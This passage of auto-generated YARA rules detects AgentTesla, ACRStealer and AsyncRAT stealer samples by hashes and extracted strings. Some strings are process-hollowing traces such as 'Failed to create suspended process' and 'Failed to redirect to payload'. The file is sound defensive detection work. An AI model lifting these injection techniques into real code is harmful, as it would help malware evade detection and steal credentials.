      $s14 = "GetUserDataDirectoryThunk" fullword ascii /* score: '12.00'*/
      $s15 = "GetCrashReports_ExportThunk" fullword ascii /* score: '12.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x5550 or uint16(0) == 0x4f50 ) and filesize < 16000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__057cca90_AgentTesla_signature__1e90a0e0769973c9f8edd53d008ca694_imphash__AgentTesla_signature__25e306_88 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_057cca90.tar, AgentTesla(signature)_1e90a0e0769973c9f8edd53d008ca694(imphash).exe, AgentTesla(signature)_25e3064d3ad9ad1f40911fe3d3c5c65f(imphash).exe, AgentTesla(signature)_57a57b52c398ba0bf2f72c7ddb5a9e1e(imphash).exe, AgentTesla(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, AgentTesla(signature)_9eeb76c5ed4b34e66260a9300680a9c0(imphash).exe, AgentTesla(signature)_fcf36bf30437909fd62937df8a303a93(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "057cca90c1c6379e12d4723722c8143dbfba3490920d77944ff6d864869bef05"
      hash2 = "3276db816ba3eecb3cc996d09f2333f10c93b1e895276f4953664e7a3dbc4b47"
      hash3 = "0700f6ba7bbe9b9ed0ac97747b56d75da3d2b942a697ddb11344f39f28464177"
      hash4 = "8603da5c311b08b5868e22b6f495dca6f2925e5582403d59ba9fb617d34c1c1b"
      hash5 = "80df1e272fd2703ce0da68500e5388fbc46aaf860db90a54ed4ea5a38fb962df"
      hash6 = "2d3689a4a57ad183e445b7221da670b17264aea9090dd0c9735db5ce285e2ddc"
      hash7 = "33f5967acccf0ba4bca1b2305d022590aeecdf55427d055c79918f5f88ffe620"
   strings:
      $s1 = "*ComputePublicKeyToken" fullword ascii /* score: '16.00'*/
      $s2 = "2InitializeExecutionDomain" fullword ascii /* score: '16.00'*/
      $s3 = "\"ProcessFinalizers" fullword ascii /* score: '15.00'*/
      $s4 = "NFindInterfaceMethodImplementationTarget" fullword ascii /* score: '14.00'*/
      $s5 = "tRuntimeTypeHandleToParameterTypeRuntimeTypeHandleHashtable,FunctionPointerTypeKey" fullword ascii /* score: '13.00'*/
      $s6 = "RFunctionPointerRuntimeTypeHandleHashtable,GenericTypeInstanceKey" fullword ascii /* score: '13.00'*/
      $s7 = "2RuntimeMethodKeyHashtable" fullword ascii /* score: '13.00'*/
      $s8 = "NDynamicGenericMethodComponentsHashtableDMethodDescBasedGenericMethodLookup" fullword ascii /* score: '13.00'*/
      $s9 = "HTryGetMethodMetadataFromStartAddress" fullword ascii /* score: '12.00'*/
      $s10 = ":GetExceptionForLastWin32Error" fullword ascii /* score: '12.00'*/
      $s11 = "(GetRuntimeTypeHandle" fullword ascii /* score: '12.00'*/
      $s12 = " GetBooleanConfig" fullword ascii /* score: '12.00'*/
      $s13 = "2GetExceptionForWin32Error" fullword ascii /* score: '12.00'*/
      $s14 = "&GetRuntimeException" fullword ascii /* score: '12.00'*/
      $s15 = "&GetAddressFromIndex@" fullword ascii /* score: '12.00'*/
   condition:
      ( ( uint16(0) == 0x5550 or uint16(0) == 0x5a4d ) and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__56ffbbdda63dbdf1891621098d41e68d_imphash__AgentTesla_signat_89 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash3 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash4 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash5 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
   strings:
      $s1 = ".System.Formats.Asn1.dll" fullword ascii /* score: '23.00'*/
      $s2 = "2System.Net.Primitives.dll&System.Net.Security" fullword ascii /* score: '22.00'*/
      $s3 = "GetCountNoLocksnSystem.Collections.Generic.IDictionary<TKey,TValue>.Add" fullword ascii /* score: '21.00'*/
      $s4 = "GetParameterzSystem.Linq.Expressions.IParameterProvider.get_ParameterCount$get_ParameterCount GetCompileMethod" fullword ascii /* score: '18.00'*/
      $s5 = "OnValidate*get_EnhancedKeyUsages@" fullword ascii /* score: '17.00'*/
      $s6 = "DecoderDBCS8DistributedContextPropagator LegacyPropagator\"ProcessWaitHandle4SYSTEM_PROCESS_INFORMATIONS" fullword ascii /* score: '17.00'*/
      $s7 = "$GetIntegerContents" fullword ascii /* score: '14.00'*/
      $s8 = "erOfArgumentsForMembersRLambdaTypeMustBeDerivedFromSystemDelegate0MemberNotFieldOrProperty2MethodNotPropertyAccessor2PropertyDoe" ascii /* score: '14.00'*/
      $s9 = "\"GetCertHashString" fullword ascii /* score: '12.00'*/
      $s10 = ",<get_NotBefore>b__31_0(<get_Version>b__35_0@" fullword ascii /* score: '12.00'*/
      $s11 = "OpenFlags4X500DistinguishedNameFlags\"X509KeyUsageFlags" fullword ascii /* score: '12.00'*/
      $s12 = "SafeTokenHandle&AsnContentException" fullword ascii /* score: '12.00'*/
      $s13 = " CompilerServices\"EmbeddedAttribute" fullword ascii /* score: '12.00'*/
      $s14 = "0IncorrectNumberOfIndexesXIncorrectNumberOfLambdaDeclarationParametersVIncorrectNumberOfMembersForGivenConstructorHIncorrectNumb" ascii /* score: '12.00'*/
      $s15 = "ThrowIfNotEmpty" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _ACRStealer_signature__12a38730_ACRStealer_signature__2bc1ce72_ACRStealer_signature__3326682d_ACRStealer_signature__3c1c260d_90 {
   meta:
      description = "_subset_batch - from files ACRStealer(signature)_12a38730.zip, ACRStealer(signature)_2bc1ce72.zip, ACRStealer(signature)_3326682d.zip, ACRStealer(signature)_3c1c260d.zip, ACRStealer(signature)_4b844c48.zip, ACRStealer(signature)_d9c666aa.zip, ACRStealer(signature)_eb6161cf.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "12a387304bb387f3e0e6417e388e80ab024a0fe962623c58c7648cba8d7d074e"
      hash2 = "2bc1ce727194b217aa744d76d3ab5dc29838ebaf8728bd5cbdf81480ab2218a2"
      hash3 = "3326682d78ab927d07b952c00faf64f67dc3e29291a2a893d9a0a25cef963913"
      hash4 = "3c1c260d457d0ecdfae8dc12785b1f10502d9643657897b7eef2323b5422fd09"
      hash5 = "4b844c4850ea6f56c16a147c5aeefdf638efe8fbf4b01feba12ab234d2926761"
      hash6 = "d9c666aaa2e2dd42c5ffffb79d2b31fde5e4293f749fab8b11adfed255bcef1f"
      hash7 = "eb6161cf9f5942ee8517d52eae56783dbd7a97a1081f86a5f170e56b7a6e09aa"
   strings:
      $x1 = "x86/api-ms-win-core-processthreads-l1-1-1.dll" fullword ascii /* score: '31.00'*/
      $x2 = "x86/api-ms-win-crt-process-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $s3 = "x86/api-ms-win-crt-filesystem-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s4 = "x86/api-ms-win-crt-private-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s5 = "x86/api-ms-win-core-rtlsupport-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s6 = "x86/api-ms-win-crt-environment-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s7 = "x86/api-ms-win-core-string-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s8 = "x86/api-ms-win-crt-conio-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s9 = "x86/api-ms-win-core-synch-l1-2-0.dll" fullword ascii /* score: '20.00'*/
      $s10 = "x86/api-ms-win-core-profile-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s11 = "x86/api-ms-win-crt-math-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s12 = "x86/api-ms-win-core-synch-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s13 = "x86/api-ms-win-crt-heap-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s14 = "x86/api-ms-win-core-sysinfo-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s15 = "x86/api-ms-win-core-timezone-l1-1-0.dll" fullword ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x4b50 and filesize < 24000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__057cca90_AgentTesla_signature__1e90a0e0769973c9f8edd53d008c_91 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_057cca90.tar, AgentTesla(signature)_1e90a0e0769973c9f8edd53d008ca694(imphash).exe, AgentTesla(signature)_25e3064d3ad9ad1f40911fe3d3c5c65f(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_57a57b52c398ba0bf2f72c7ddb5a9e1e(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_9eeb76c5ed4b34e66260a9300680a9c0(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "057cca90c1c6379e12d4723722c8143dbfba3490920d77944ff6d864869bef05"
      hash3 = "3276db816ba3eecb3cc996d09f2333f10c93b1e895276f4953664e7a3dbc4b47"
      hash4 = "0700f6ba7bbe9b9ed0ac97747b56d75da3d2b942a697ddb11344f39f28464177"
      hash5 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash6 = "8603da5c311b08b5868e22b6f495dca6f2925e5582403d59ba9fb617d34c1c1b"
      hash7 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash8 = "80df1e272fd2703ce0da68500e5388fbc46aaf860db90a54ed4ea5a38fb962df"
      hash9 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash10 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash11 = "2d3689a4a57ad183e445b7221da670b17264aea9090dd0c9735db5ce285e2ddc"
      hash12 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash13 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = "Failed to allocate memory in target process" fullword wide /* score: '24.00'*/
      $s2 = "Failed to create suspended process" fullword wide /* score: '18.00'*/
      $s3 = "Failed to write process memory" fullword wide /* score: '18.00'*/
      $s4 = "The output char buffer is too small to contain the decoded characters, encoding '{0}' fallback '{1}'" fullword wide /* score: '18.00'*/
      $s5 = "The output byte buffer is too small to contain the encoded data, encoding '{0}' fallback '{1}'" fullword wide /* score: '16.00'*/
      $s6 = "[!] Failed to redirect to payload:" fullword wide /* score: '16.00'*/
      $s7 = "$WriteProcessMemory VirtualProtectEx" fullword ascii /* score: '15.00'*/
      $s8 = "\"ReadProcessMemory" fullword ascii /* score: '15.00'*/
      $s9 = "WriteProcessMemor" fullword wide /* score: '15.00'*/
      $s10 = "validOperationException_ConcurrentOperationsNotSupportedjThrowInvalidOperationException_HandleIsNotInitialized`ThrowInvalidOpera" ascii /* score: '12.00'*/
      $s11 = "GetThreadContex" fullword wide /* score: '12.00'*/
      $s12 = "Wow64GetThreadContex" fullword wide /* score: '12.00'*/
      $s13 = "&SetDefaultFallbacks GetByteCountFast@" fullword ascii /* score: '9.00'*/
      $s14 = "GetFileNotOpen" fullword ascii /* score: '9.00'*/
      $s15 = "get_FileHeader@" fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x5550 ) and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__462a1c4623dd5653cfbabfcb88d6bdd9_imphash__AgentTesla_signat_92 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_462a1c4623dd5653cfbabfcb88d6bdd9(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_792661c7a60d6624adab7be57ff57e58(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_9eeb76c5ed4b34e66260a9300680a9c0(imphash).exe, AgentTesla(signature)_bb4d11c9.tar, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fcf36bf30437909fd62937df8a303a93(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "e4da512f9f4983b8fe80ba952531414acccd5b037c2c8488055c159c7b88b0c4"
      hash3 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash4 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash5 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash6 = "7d8a20d5f8a916da554fb667337a6f0413dac138a09332d59ebbbb05bc7cfe48"
      hash7 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash8 = "2d3689a4a57ad183e445b7221da670b17264aea9090dd0c9735db5ce285e2ddc"
      hash9 = "bb4d11c9981fbf16b12cf1731ff24da3f0f5127bb363fb9cc55b50d8e977f3b2"
      hash10 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash11 = "33f5967acccf0ba4bca1b2305d022590aeecdf55427d055c79918f5f88ffe620"
   strings:
      $s1 = "System.Collections.Generic.IEnumerable<System.Reflection.MethodInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s2 = "System.Collections.Generic.IEnumerator<System.Reflection.EventInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s3 = "System.Collections.Generic.IEnumerable<System.Reflection.Runtime.MethodInfos.RuntimeMethodInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s4 = "System.Collections.Generic.IEnumerable<System.Reflection.EventInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s5 = "\"GetAttributeUsage" fullword ascii /* score: '14.00'*/
      $s6 = "BResolveGenericVirtualMethodTarget@" fullword ascii /* score: '14.00'*/
      $s7 = "NTryGetMethodInvokeMetadataFromInvokeMap" fullword ascii /* score: '13.00'*/
      $s8 = ",TryGetMethodInvokeInfo" fullword ascii /* score: '13.00'*/
      $s9 = "TTryGetGenericMethodDictionaryForComponents@" fullword ascii /* score: '12.00'*/
      $s10 = "4GetModuleForMetadataReader@" fullword ascii /* score: '12.00'*/
      $s11 = "8GetMethodEntryPointComponent@" fullword ascii /* score: '12.00'*/
      $s12 = "6IsMatchingOrCompatibleEntry&GetMethodEntryPoint@" fullword ascii /* score: '12.00'*/
      $s13 = ",GetDictionaryComponent@" fullword ascii /* score: '12.00'*/
      $s14 = "get_RuntimeName(GetRuntimeParameters@" fullword ascii /* score: '12.00'*/
      $s15 = ",GetDynamicMethodInvoke" fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x4f50 ) and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__56ffbbdda63dbdf1891621098d41e68d_imphash__AgentTesla_signat_93 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_9eeb76c5ed4b34e66260a9300680a9c0(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fcf36bf30437909fd62937df8a303a93(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash3 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash4 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash5 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash6 = "2d3689a4a57ad183e445b7221da670b17264aea9090dd0c9735db5ce285e2ddc"
      hash7 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash8 = "33f5967acccf0ba4bca1b2305d022590aeecdf55427d055c79918f5f88ffe620"
   strings:
      $s1 = "BGetStringFromMemoryInNativeFormatDGetRuntimeFieldHandleForComponents@" fullword ascii /* score: '15.00'*/
      $s2 = "RTryGetStaticRuntimeMethodHandleComponentsRGetMethodDescForStaticRuntimeMethodHandle4TryGetMetadataForNamedType" fullword ascii /* score: '15.00'*/
      $s3 = "System.Collections.Generic.IEnumerator<System.Reflection.Runtime.MethodInfos.RuntimeMethodInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s4 = "Non-static method requires a target" fullword wide /* score: '14.00'*/
      $s5 = "The target method returned a null reference" fullword wide /* score: '14.00'*/
      $s6 = ",InvokeWithFewArguments,GetCoercedDefaultValue@" fullword ascii /* score: '13.00'*/
      $s7 = "TGetMethodDescForDynamicRuntimeMethodHandle@" fullword ascii /* score: '12.00'*/
      $s8 = "GetHashCod" fullword wide /* score: '12.00'*/
      $s9 = "\"OpenMethodInvoker,RuntimeDummyMethodInfoC" fullword ascii /* score: '11.00'*/
      $s10 = "BinderBundle\"DynamicInvokeInfo[" fullword ascii /* score: '11.00'*/
      $s11 = "0ThrowForArgCountMismatch.InvokeWithManyArguments@" fullword ascii /* score: '11.00'*/
      $s12 = "Only system-provided types can be passed to the GetUninitializedObject method. '{0}' is not a valid instance of a type" fullword wide /* score: '11.00'*/
      $s13 = "Type passed in must be derived from System.Attribute or System.Attribute itself" fullword wide /* score: '10.00'*/
      $s14 = "6GetMatchingCustomAttributes" fullword ascii /* score: '9.00'*/
      $s15 = "6GetDeclaredCustomAttributes@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__f5ed35f2_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_94 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f5ed35f2.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4f688828.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b98f8054.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f5ed35f25e6dc2ab4655db7d680593dc2e49bbcf42cf7904a20985b7971acc0a"
      hash2 = "4f6888285a0c704b7d410bdfa80bd1540a83e0f67d7764044c6c7da94bc2d11c"
      hash3 = "b98f8054cb3dd04bcde337b449934c30420de82458dcf795d51ff0f15f24af95"
   strings:
      $s1 = "2TimeZoneConverter.DataLoader+<GetEmbeddedData>d__1" fullword ascii /* score: '25.00'*/
      $s2 = "DataLoader" fullword ascii /* score: '13.00'*/
      $s3 = "<GetSystemTimeZones>b__32_1" fullword ascii /* score: '12.00'*/
      $s4 = "<GetSystemTimeZones>b__32_0" fullword ascii /* score: '12.00'*/
      $s5 = "GetEmbeddedData" fullword ascii /* score: '9.00'*/
      $s6 = "get_KnownRailsTimeZoneNames" fullword ascii /* score: '9.00'*/
      $s7 = "TryGetTimeZoneInfo" fullword ascii /* score: '9.00'*/
      $s8 = "GetTimeZoneInfo" fullword ascii /* score: '9.00'*/
      $s9 = "get_KnownWindowsTimeZoneIds" fullword ascii /* score: '9.00'*/
      $s10 = "get_KnownIanaTimeZoneNames" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( all of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__462a1c4623dd5653cfbabfcb88d6bdd9_imphash__AgentTesla_signature__56ffbbdda63dbdf1891621098d41e68d_imph_95 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_462a1c4623dd5653cfbabfcb88d6bdd9(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_792661c7a60d6624adab7be57ff57e58(imphash).exe, AgentTesla(signature)_bb4d11c9.tar, AgentTesla(signature)_fcf36bf30437909fd62937df8a303a93(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e4da512f9f4983b8fe80ba952531414acccd5b037c2c8488055c159c7b88b0c4"
      hash2 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash3 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash4 = "7d8a20d5f8a916da554fb667337a6f0413dac138a09332d59ebbbb05bc7cfe48"
      hash5 = "bb4d11c9981fbf16b12cf1731ff24da3f0f5127bb363fb9cc55b50d8e977f3b2"
      hash6 = "33f5967acccf0ba4bca1b2305d022590aeecdf55427d055c79918f5f88ffe620"
   strings:
      $s1 = ":get_ContainsGenericParameters$GetRootElementType" fullword ascii /* score: '12.00'*/
      $s2 = "(GetConstantCharValue@" fullword ascii /* score: '9.00'*/
      $s3 = "HCoreGetDeclaredSyntheticConstructors,CoreGetDeclaredMethods@" fullword ascii /* score: '9.00'*/
      $s4 = "*GetConstantInt32Array@" fullword ascii /* score: '9.00'*/
      $s5 = " get_MetadataName" fullword ascii /* score: '9.00'*/
      $s6 = ",GetConstantUInt64Array@" fullword ascii /* score: '9.00'*/
      $s7 = ",GetConstantUInt64Value@" fullword ascii /* score: '9.00'*/
      $s8 = ",GetConstantUInt16Array@" fullword ascii /* score: '9.00'*/
      $s9 = ",GetConstantDoubleArray@" fullword ascii /* score: '9.00'*/
      $s10 = "*GetConstantSByteValue@" fullword ascii /* score: '9.00'*/
      $s11 = "*GetConstantInt32Value@" fullword ascii /* score: '9.00'*/
      $s12 = "GetEvent@" fullword ascii /* score: '9.00'*/
      $s13 = "(GetConstantByteArray@" fullword ascii /* score: '9.00'*/
      $s14 = "*GetConstantInt16Value@" fullword ascii /* score: '9.00'*/
      $s15 = "(GetConstantEnumArray@" fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x4f50 ) and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__057cca90_AgentTesla_signature__1e90a0e0769973c9f8edd53d008c_96 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_057cca90.tar, AgentTesla(signature)_1e90a0e0769973c9f8edd53d008ca694(imphash).exe, AgentTesla(signature)_25e3064d3ad9ad1f40911fe3d3c5c65f(imphash).exe, AgentTesla(signature)_462a1c4623dd5653cfbabfcb88d6bdd9(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_57a57b52c398ba0bf2f72c7ddb5a9e1e(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_792661c7a60d6624adab7be57ff57e58(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_9eeb76c5ed4b34e66260a9300680a9c0(imphash).exe, AgentTesla(signature)_bb4d11c9.tar, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fcf36bf30437909fd62937df8a303a93(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "057cca90c1c6379e12d4723722c8143dbfba3490920d77944ff6d864869bef05"
      hash3 = "3276db816ba3eecb3cc996d09f2333f10c93b1e895276f4953664e7a3dbc4b47"
      hash4 = "0700f6ba7bbe9b9ed0ac97747b56d75da3d2b942a697ddb11344f39f28464177"
      hash5 = "e4da512f9f4983b8fe80ba952531414acccd5b037c2c8488055c159c7b88b0c4"
      hash6 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash7 = "8603da5c311b08b5868e22b6f495dca6f2925e5582403d59ba9fb617d34c1c1b"
      hash8 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash9 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash10 = "7d8a20d5f8a916da554fb667337a6f0413dac138a09332d59ebbbb05bc7cfe48"
      hash11 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash12 = "2d3689a4a57ad183e445b7221da670b17264aea9090dd0c9735db5ce285e2ddc"
      hash13 = "bb4d11c9981fbf16b12cf1731ff24da3f0f5127bb363fb9cc55b50d8e977f3b2"
      hash14 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash15 = "33f5967acccf0ba4bca1b2305d022590aeecdf55427d055c79918f5f88ffe620"
      hash16 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = "&GetProcessShortName" fullword ascii /* score: '20.00'*/
      $s2 = "\"GetCurrentProcess" fullword ascii /* score: '20.00'*/
      $s3 = " OpenProcessToken" fullword ascii /* score: '18.00'*/
      $s4 = "ExecutionEngineException previously indicated an unspecified fatal error in the runtime. The runtime no longer raises this excep" ascii /* score: '15.00'*/
      $s5 = "&NtProcessInfoHelper" fullword ascii /* score: '15.00'*/
      $s6 = "&GetThreadWaitReason" fullword ascii /* score: '12.00'*/
      $s7 = " get_ComputerName" fullword ascii /* score: '12.00'*/
      $s8 = "(LookupPrivilegeValue" fullword ascii /* score: '10.00'*/
      $s9 = "TargetException2TargetInvocationException:TargetParameterCountException" fullword ascii /* score: '10.00'*/
      $s10 = "2GetExceptionForHRInternal" fullword ascii /* score: '9.00'*/
      $s11 = "Kernel32+" fullword ascii /* score: '9.00'*/
      $s12 = "0GetPerformanceCounterLib" fullword ascii /* score: '9.00'*/
      $s13 = "get_NameTable@" fullword ascii /* score: '9.00'*/
      $s14 = "GetStringTable@" fullword ascii /* score: '9.00'*/
      $s15 = "GetFullPath&GetFullPathInternal" fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x5550 or uint16(0) == 0x4f50 ) and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__19c6a84c_AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_97 {
   meta:
